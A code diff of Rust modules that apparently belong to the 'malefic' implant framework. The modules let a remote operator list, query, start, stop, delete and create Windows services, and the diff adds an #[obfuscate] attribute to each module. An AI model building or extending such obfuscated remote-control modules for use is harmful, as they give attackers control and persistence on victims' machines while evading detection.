@@ -1,8 +1,13 @@
-use malefic_helper::win::service::{ServiceConfig, ServiceErrorControl, ServiceExitCode, ServiceManager, ServiceStartType, ServiceStatus};
-use malefic_proto::proto::modulepb::Service;
 use crate::prelude::*;
+use malefic_os_win::service::{
+    ServiceConfig, ServiceErrorControl, ServiceExitCode, ServiceManager, ServiceStartType,
+    ServiceStatus,
+};
+use malefic_proto::proto::modulepb::Service;
 
-fn service_config_to_proto(config: &ServiceConfig) -> malefic_proto::proto::modulepb::ServiceConfig {
+fn service_config_to_proto(
+    config: &ServiceConfig,
+) -> malefic_proto::proto::modulepb::ServiceConfig {
     let config = config.clone();
     malefic_proto::proto::modulepb::ServiceConfig {
         name: config.name.clone(),
@@ -10,11 +15,18 @@ fn service_config_to_proto(config: &ServiceConfig) -> malefic_proto::proto::modu
         executable_path: config.executable_path.to_string_lossy().to_string(),
         start_type: config.start_type as u32,
         error_control: config.error_control as u32,
-        account_name: config.account_name.clone().unwrap_or_default().to_string_lossy().to_string(),
+        account_name: config
+            .account_name
+            .clone()
+            .unwrap_or_default()
+            .to_string_lossy()
+            .to_string(),
     }
 }
 
-fn service_status_to_proto(status: &ServiceStatus) -> malefic_proto::proto::modulepb::ServiceStatus {
+fn service_status_to_proto(
+    status: &ServiceStatus,
+) -> malefic_proto::proto::modulepb::ServiceStatus {
     let status = status.clone();
     malefic_proto::proto::modulepb::ServiceStatus {
         current_state: status.current_state as u32,
@@ -28,7 +40,6 @@ fn service_status_to_proto(status: &ServiceStatus) -> malefic_proto::proto::modu
     }
 }
 
-
 pub struct ServiceList {}
 
 #[async_trait]
@@ -36,24 +47,25 @@ pub struct ServiceList {}
 impl Module for ServiceList {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for ServiceList {
     async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let _ = check_request!(_receiver, Body::Request)?;
         let manager = ServiceManager::open()?;
-        
+
         let services = manager.list_and_query()?;
         let mut resp = malefic_proto::proto::modulepb::ServicesResponse::default();
-        
+
         for service in services {
             let config = service_config_to_proto(&service.config);
-            let status = service_status_to_proto(service.status.as_ref().unwrap());
+            let status = service.status.as_ref().map(service_status_to_proto);
             resp.services.push(Service {
                 config: Some(config),
-                status: Some(status),
+                status,
             });
         }
 
-        // 返回服务列表
+        // Return service list
         Ok(TaskResult::new_with_body(id, Body::ServicesResponse(resp)))
     }
 }
@@ -64,6 +76,7 @@ pub struct ServiceStart {}
 #[module_impl("service_start")]
 impl Module for ServiceStart {}
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for ServiceStart {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::ServiceRequest)?;
@@ -82,6 +95,7 @@ pub struct ServiceStop {}
 impl Module for ServiceStop {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for ServiceStop {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::ServiceRequest)?;
@@ -100,6 +114,7 @@ pub struct ServiceDelete {}
 impl Module for ServiceDelete {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for ServiceDelete {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::ServiceRequest)?;
@@ -114,13 +129,13 @@ impl ModuleImpl for ServiceDelete {
     }
 }
 
-
 pub struct ServiceQuery {}
 
 #[async_trait]
 #[module_impl("service_query")]
 impl Module for ServiceQuery {}
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for ServiceQuery {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::ServiceRequest)?;
@@ -130,13 +145,15 @@ impl ModuleImpl for ServiceQuery {
         let config = manager.query_service(&req.name)?;
         let status = manager.query_service_status(&config)?;
 
-        Ok(TaskResult::new_with_body(id, Body::ServiceResponse(Service { 
-            config: Some(service_config_to_proto(&config)), 
-            status: Some(service_status_to_proto(&status)) 
-        })))
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::ServiceResponse(Service {
+                config: Some(service_config_to_proto(&config)),
+                status: Some(service_status_to_proto(&status)),
+            }),
+        ))
     }
 }
-
 
 pub struct ServiceCreate {}
 
@@ -145,15 +162,16 @@ pub struct ServiceCreate {}
 impl Module for ServiceCreate {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for ServiceCreate {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
-        // 从请求中获取 `ServiceRequest`
+        // Get ServiceRequest from request
         let req = check_request!(receiver, Body::ServiceRequest)?;
 
-        // 打开服务管理器
+        // Open service manager
         let manager = ServiceManager::open()?;
 
-        // 从请求数据中提取服务创建参数
+        // Extract service creation parameters from request data
         let service_name = req.name.clone();
         let display_name = req.display_name.clone();
         let executable_path = req.executable_path.clone();
@@ -172,16 +190,16 @@ impl ModuleImpl for ServiceCreate {
         };
         let account_name = req.account_name.clone();
 
-        // 创建服务
+        // Create service
         let _ = manager.create_service(
             &service_name,
             &display_name,
             &executable_path,
             start_type,
             error_control,
-            Some(&*account_name)
+            Some(&*account_name),
         )?;
-        
+
         Ok(TaskResult::new(id))
     }
 }
